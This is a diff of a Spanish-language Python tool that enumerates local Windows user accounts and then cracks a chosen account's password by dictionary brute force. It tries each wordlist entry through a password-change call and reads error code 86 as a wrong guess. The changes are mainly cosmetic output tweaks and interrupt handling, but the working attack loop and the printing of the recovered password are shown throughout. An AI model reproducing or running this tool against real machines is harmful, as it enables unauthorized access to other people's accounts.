@@ -10,7 +10,7 @@
 #          ██║  ██╗██║  ██║██║ ╚═╝ ██║╚██████╔╝███████╗
 #          ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚══════╝
 #                                                         By: LawlietJH
-#                                                               v1.0.0
+#                                                               v1.0.1
 
 
 import msvcrt
@@ -28,7 +28,7 @@ Banner = """
                   ██║  ██╗██║  ██║██║ ╚═╝ ██║╚██████╔╝███████╗
                   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚══════╝
                                                          By: LawlietJH
-                                                               v1.0.0
+                                                               v1.0.1
 
 """
 
@@ -162,12 +162,16 @@ def GetUsersName():
 	
 	return Users
 
+#=======================================================================
+#=======================================================================
+#=======================================================================
+
 
 def GetUserData(Usuario):
 	
 	# ~ os.system('Cls')
 	# ~ print('\n\n\n ==============================================================================')
-	print('\n\n\n     [~] Nombre de Usuario: ' + Usuario)
+	print('\n\n     [~] Nombre de Usuario: ' + Usuario)
 	print('\n     [~] Nivel de Privilegios:', ('2 (Admin)' if IsAdmin(Usuario) == '2' else ('1 (Sin Privilegios)' if IsAdmin(Usuario) == '1' else '0 (Invitado)')))
 	print('\n     [~] Grupo:', WN.NetUserGetLocalGroups(None, Usuario , 0)[0])
 	print('\n     [~] La Contraseña Fue Cambiada Por Última Ves Hace:\n\n\t [*] ', end='')
@@ -181,11 +185,6 @@ def GetUserData(Usuario):
 	if PT[4] != 0: print(PT[4],'Segundos.')
 	else: print('Nunca.')
 	# ~ print('\n ==============================================================================')
-	
-
-#=======================================================================
-#=======================================================================
-#=======================================================================
 
 
 def InformacionDeUsuarios():
@@ -194,9 +193,11 @@ def InformacionDeUsuarios():
 	
 	while True:
 		
+		print(Banner)
+		
 		Cont = 1
 		
-		print('\n\n [+] Lista de Usuarios Existentes:\n')
+		print('\n [+] Lista de Usuarios Existentes:\n')
 		
 		for x in Users:
 			
@@ -245,11 +246,13 @@ def FuerzaBruta(Usuario):
 	Words = []
 	Actual = 1
 	
-	print('\n\n\t [+] Abriendo Diccionario!\n\n')
+	sys.stdout.write('\n\n\t [+] Abriendo Diccionario!')
+	
 	with open('Diccionario.txt','r') as File: Words = File.readlines()
 	Total = len(Words)
 	
-	print('\n\n\t [+] Comenzando el Ataque!\n\n')
+	sys.stdout.write('\r\t [+] Comenzando el Ataque!\n\n')
+	
 	for Passwd in Words:
 		
 		Passwd = Passwd.replace('\n','')
@@ -257,20 +260,22 @@ def FuerzaBruta(Usuario):
 		try:
 			
 			ChangePasswordUser(Passwd, Passwd, Usuario)
-			
 			return Passwd
 		
+		except KeyboardInterrupt:
+			
+			print('\n\n\t [!] Cancelando...!')
+			time.sleep(2)
+			return
+			
 		except pywintypes.error as error:
 			
 			Err = error.__str__().replace('(','').replace(')','').replace('\'','').split(', ')[0]
 			
 			if int(Err) == 86:
-				
 				Progreso(Actual, Total, Passwd)
 				Actual += 1
-				
 			if int(Err) == 5:
-				
 				# ~ print('\n\n El Usuario \'' + Usuario + '\' Nego El Acceso (Código 5).\n\n')
 				return False
 				
@@ -282,7 +287,6 @@ def Main():
 	
 	PassWD = ''
 	os.system('Cls')
-	print(Banner)
 	
 	Usuario = InformacionDeUsuarios()
 	
@@ -295,21 +299,21 @@ def Main():
 			print(Banner)
 			GetUserData(Usuario)
 			PassWD = FuerzaBruta(Usuario)
-		except KeyboardInterrupt:
 			
+		except KeyboardInterrupt:
 			print('\n\n\t [!] Cancelando...!')
+			time.sleep(2)
 			return
+			
 	else: return
 	
+	if PassWD == None: return
 	if PassWD == False:
 		
 		print('\n\n El Usuario \'' + Usuario + '\' No Tiene Contraseña.\n\n')
 		os.system('Pause > Nul')
 		return
-		
-	os.system('Cls')
 	
-	print(Banner)
 	print('\n\n\n Password del Usuario \'' + Usuario + '\': ' + PassWD)
 	
 	os.system('Pause > Nul')
